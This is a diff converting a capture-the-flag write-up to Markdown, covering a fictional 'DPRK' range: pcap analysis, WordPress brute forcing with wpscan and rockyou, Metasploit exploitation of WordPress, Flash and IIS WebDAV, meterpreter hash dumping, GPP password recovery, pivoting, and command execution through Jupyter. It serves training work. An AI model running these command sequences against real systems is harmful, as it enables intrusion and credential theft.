@@ -1,32 +1,32 @@
-
-==PCAP Challenges==
+<!--toc--> 
+# PCAP Challenges
 
 They give you a pcap
 
 Watering Hole 1 - The URL for the North Kiringul Central News Agency's website is www.nkcna.ctf
 
-===PCAP 1===
+## PCAP 1
 The IP Address of www.nkcna.ctf is 172.25.45.92
 
-===PCAP 2===
+## PCAP 2
 The IP Address of the proxy server is 192.168.51.66
 
-===PCAP 3===
+## PCAP 3
 How many unique times has 192.168.51.66 browsed to the NKCNA homepage at http://www.nkcna.ctf/?
 
 213 times.  I used this wireshark filter: ip.src == 192.168.51.66 && http.host == www.nkcna.ctf && http.request.uri == /
 
-===PCAP 4===
+## PCAP 4
 Aside from HTTP and DNS, what other unencrypted protocol is found in the PCAP?
 
 FTP.  I used this wireshark filter: ip.src == 192.168.51.66 && !http && !dns
 
-===PCAP 5===
+## PCAP 5
 What is the password of the user that logs in to the FTP server?
 
 daebak
 
-===PCAP 6===
+## PCAP 6
 Login to the FTP server using the credentials you found in the PCAP.
 
 What is the MD5 hash of the WordPress_Security.pdf file on the server?
@@ -36,19 +36,19 @@ Creds: koli/daebak
 
 Hash 873f9e060518b04c85ae59f0fbdbabc9
 
-==Watering Hole Challenges==
+# Watering Hole Challenges
 
 Helpful to use `wpscan`. 
 
 `wpscan --url http://www.nkcna.ctf/`
 
-===Watering Hole 3===
+## Watering Hole 3
 
 What is the version of Wordpress being used? 4.7.2
 
 Output from wpscan
 
-===Watering Hole 4===
+## Watering Hole 4
 
 What is the username of the person who likely posts the news stories?
 
@@ -56,7 +56,7 @@ nkcna_author
 
 `wpscan --url http://www.nkcna.ctf/ --enumerate u`
 
-===Watering Hole 5===
+## Watering Hole 5
 
 What is the nkcna_author's cleartext password?
 
@@ -69,13 +69,13 @@ Trying nkcna_author / samsung Time: 00:00:32 <==================================
 `wpscan --url http://www.nkcna.ctf/ -U nkcna_author --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks`
 
 
-===Watering Hole 6===
+## Watering Hole 6
 
 What is the English title of the most recent draft post?
 
 Missile Launch Great Success for Our Glorious Leader
 
-===Watering Hole 7===
+## Watering Hole 7
 
 What is the name of the Metasploit module that will gain remote code execution?
 
@@ -176,7 +176,7 @@ What is the name of the Metasploit module that will gain remote code execution?
 https://wpvulndb.com/vulnerabilities/7652 from above output
 `exploit/unix/webapp/wp_creativecontactform_file_upload`
 
-===Watering Hole 8===
+## Watering Hole 8
 
 Now that we have access, what is WordPress database password in wp-config.php?
 
@@ -250,13 +250,13 @@ Mode              Size  Type  Last modified              Name
 
 MoreLikeKimJongFUN
 
-===Watering Hole 9===
+## Watering Hole 9
 
 What is the full path to where Apache logs web access requests?
 
 '/var/log/apache2/access.log'
 
-===Watering Hole 10===
+## Watering Hole 10
 
 What is the full path to the setuid binary that will allow us to read the log file?
 
@@ -264,7 +264,7 @@ What is the full path to the setuid binary that will allow us to read the log fi
 
 /usr/local/bin/readlog
 
-===Watering Hole 11===
+## Watering Hole 11
 
 What URL is frequently accessed by a user in the DPRK source IP range?
 
@@ -273,45 +273,45 @@ What URL is frequently accessed by a user in the DPRK source IP range?
 
 /submit_story.html
 
-===Watering Hole 12===
+## Watering Hole 12
 
 What is the target's user-agent string?
 
 Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
 
-===Watering Hole 13===
+## Watering Hole 13
 
 What browser are they using?
 
 Internet Explorer 11
 
-===Watering Hole 14===
+## Watering Hole 14
 
 Based on the user-agent string, what OS version is the target running?
 
 Windows 8.1
 
-===Watering Hole 15===
+## Watering Hole 15
 
  Login to your test Window 8.1 VM. What is the default home page set for IE11?
 
 
 http://www.nkcna.ctf/submit_story.html
 
-===Watering Hole 16===
+## Watering Hole 16
 
 "What version of Adobe Flash is intalled?"
 
 18.0.0.194
 
-===Watering Hole 17===
+## Watering Hole 17
 
 "What metasploit module can exploit the installed adobe version?"
 
 exploit/multi/browser/adobe_flash_hacking_team_uaf
 
 
-===Planner 1===
+## Planner 1
 
 What is the IP address of the host found?
 
@@ -454,22 +454,22 @@ meterpreter > run post/windows/manage/migrate
 meterpreter > run post/multi/manage/autoroute
 ```
 
-==KPASRF Challenges==
+# KPASRF Challenges
 
-===KPASRF 1===
+## KPASRF 1
 
 The IP Address of kpasrf.dprk.ctf is 192.168.51.66
 
 dig @192.168.51.1 kpasrf.dprk.ctf
 
-===KPASRF 2===
+## KPASRF 2
 How many TCP ports are open on this IP address?
 
 2
 
 nmap 192.168.51.66
 
-===KPASRF 3===
+## KPASRF 3
 Enumerate the FTP service for vulnerabilities.
 
 What is a valid username that can upload files to the server?
@@ -492,7 +492,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds</pre>
 
-===KPASRF 4===
+## KPASRF 4
 Let's enumerate the web server for vulnerabilites.
 
 What version of IIS is the web server running?
@@ -532,17 +532,17 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds</pre>
 
-===KPASRF 5===
+## KPASRF 5
 What administration module is enabled on this webserver, which could allow a remote user to upload or modify files?
 
 WebDAV
 
-===KPASRF 6===
+## KPASRF 6
 What is the name of a Metasploit module that could exploit one of the discovered flaws in this webserver?
 
 iis_webdav_upload_asp
 
-===RECON 1===
+## RECON 1
 Exploit onto the KPASRF webserver and get a shell.
 
 What is the contents of the text file in the C:\ directory?
@@ -559,16 +559,16 @@ Steps in msfconsole:
 > set LHOST 10.13.0.150
 > exploit</pre>
 
-==RECON Challenges==
+# RECON Challenges
 
-===Recon 2===
+## Recon 2
 What domain is this machine a part of?
 
 DPRK.CTF
 
 run systeminfo from meterpreter
 
-===Recon 3===
+## Recon 3
 Including the machine that you're currently on, how many hosts are in the 192.168.100.0/24 subnet
 
 7 (not counting the .255 entry below, I guess?)
@@ -586,14 +586,14 @@ Including the machine that you're currently on, how many hosts are in the 192.16
 [+]     IP: 192.168.100.250 MAC 50:57:43:17:01:05 (UNKNOWN)
 [+]     IP: 192.168.100.255 MAC 50:57:4e:17:01:0a (UNKNOWN)</pre>
 
-===Recon 4===
+## Recon 4
 What is the IP of the domain controller?
 
 192.168.100.250
 
 run post/windows/gather/enum_domains
 
-===Recon 5===
+## Recon 5
 What operating system is the domain controller running?
 
 Windows 2012 R2 Standard
@@ -604,29 +604,29 @@ msf5 exploit(windows/iis/iis_webdav_upload_asp) > use auxiliary/scanner/smb/smb_
 msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.13.0.150
 msf5 auxiliary(scanner/smb/smb_version) > run</pre>
 
-===Developer 1===
+## Developer 1
 What is the IP address of the developer's machine?
 
 192.168.100.15
 
 I used nslookup from meterpreter
 
-===Recon 6===
+## Recon 6
 What is the IP address of the administrator's machine?
 
 192.168.100.25
 
-===Recon 7===
+## Recon 7
 What is the IP address of the Glorious Leader's machine?
 
 192.168.100.20
 
-===Recon 8===
+## Recon 8
 Local admin is dprkadmin
 
 use post/windows/gather/enum_logged_on_users
 
-===Administrator 1===
+## Administrator 1
 
 we know the logged on user is a member of the local administrators group:
 
@@ -657,7 +657,7 @@ run post/windows/gather/hashdump</pre>
 
 Hash is c7823c16ddd435c49decf92a8d54058f
 
-===Recon 9===
+## Recon 9
 What is local admin password (in clear text)?
 
 Password: i_see_ur_cpassword
@@ -667,9 +667,9 @@ set session 1
 set domains DPRK
 exploit</pre>
 
-==Developer==
+# Developer
 
-===Developer 2===
+## Developer 2
 What is the application running on port 80 of the developer's machine?
 
 Jupyter
@@ -678,7 +678,7 @@ meterpreter > portfwd add -l 8080 -p 80 -r 192.168.100.15
 
 Open a web browser and go to localhost:8080
 
-===Developer 3===
+## Developer 3
 What is the full path to the tlc.py file shown in Jupyter?
 
 C:\Users\lee.tonghyon\Projects\tlc_jupyter\code
@@ -688,7 +688,7 @@ Open a Jupyter notebook and run this:
 <pre>import os
 print os.getcwd()</pre>
 
-===Developer 4===
+## Developer 4
 What is the MD5 of the zip containing the most recent launch code release?
 
 8bed361cf06ae70c2078e136d6f35aa5
@@ -702,28 +702,28 @@ import subprocess
 #print os.popen("dir C:\\Users\\lee.tonghyon\\Documents").read()
 print os.popen("copy C:\\Users\\lee.tonghyon\\Documents\\TLC_release_v1.2.zip C:\\Users\\lee.tonghyon\\Projects\\tlc_jupyter\\code").read()</pre>
 
-===Developer 5===
+## Developer 5
 What is the domain name of the production MQTT endpoint?
 
 mqtt.dprk.ctf
 
 Unzip the release, look at the config file.
 
-===Developer 6===
+## Developer 6
 enter a valid turret move command payload using the latitude and longitude coordinates from the first test launch location found on the PLANNER machine.
 
 missile/control/commands34:move:39.271767,127.625128:0615569d
 
 Run the script and use wireshark
 
-==Planner==
+# Planner
 
-===Planner 2===
+## Planner 2
 What is the username of the account?
 
 choe.hang-na
 
-===PTZ Camera 1===
+## PTZ Camera 1
 
 What internal/private IP has this user browsed recently?
 
@@ -760,7 +760,7 @@ HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs
 192.168.102.70
 
 
-===Planner 3===
+## Planner 3
 
 What recent document was edited?
 
@@ -779,13 +779,13 @@ L�F� *�M0��
 P�O� �:i�+00�/C:\\1wP�HIDEFI~1D	�aJP�.�M"��hidefiles�2�DaJ� SIMULA~1.XLSf	�aJ�aJ�.�N�qSimulationAndTestData.xlsxV-U����C:\hidefiles\SimulationAndTestData.xlsx9..\..\..\..\..\..\..\hidefiles\SimulationAndTestData.xlsx`�XplanneryT���D���MG�X�e��<����QPWNyT���D���MG�X�e��<����QPWN
 </pre>
 
-===Planner 4===
+## Planner 4
 
 What was the latitude and longitude of their first test launch target? (Format: latitude, longitude)
 
 39.271767, 127.625128
 
-===Planner 5===
+## Planner 5
 
 Trilaterate the source of the missiles.
 39.0458535576, 125.762142247
